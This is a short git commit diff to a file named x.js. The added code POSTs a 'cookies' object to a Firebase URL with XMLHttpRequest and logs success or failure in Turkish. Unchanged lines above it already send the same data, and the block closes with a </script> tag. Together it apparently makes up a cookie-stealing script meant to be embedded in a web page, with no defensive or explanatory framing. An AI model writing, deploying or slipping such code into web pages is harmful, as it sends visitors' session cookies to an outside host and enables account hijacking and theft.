5b30ec9ad7dc70e427a2b5ba68ab403b40e8a966
ibo442544 <92678011+ibo442544@users.noreply.github.com>
2025-05-17 12:14:38 +0300

    x.js

--- x.js
+++ x.js
@@ -6,4 +6,18 @@ var xhr = new XMLHttpRequest();
 xhr.open("POST", firebaseUrl, true);
 xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 xhr.send(JSON.stringify({ cookies: cookies }));
+var xhr = new XMLHttpRequest();
+xhr.open("POST", firebaseUrl, true);
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.onload = function() {
+  if (xhr.status >= 200 && xhr.status < 300) {
+    console.log("Başarılı:", xhr.responseText);
+  } else {
+    console.error("Hata:", xhr.status, xhr.statusText);
+  }
+};
+xhr.onerror = function() {
+  console.error("İstek sırasında bir hata oluştu.");
+};
+xhr.send(JSON.stringify({ cookies: cookies }));
 </script>
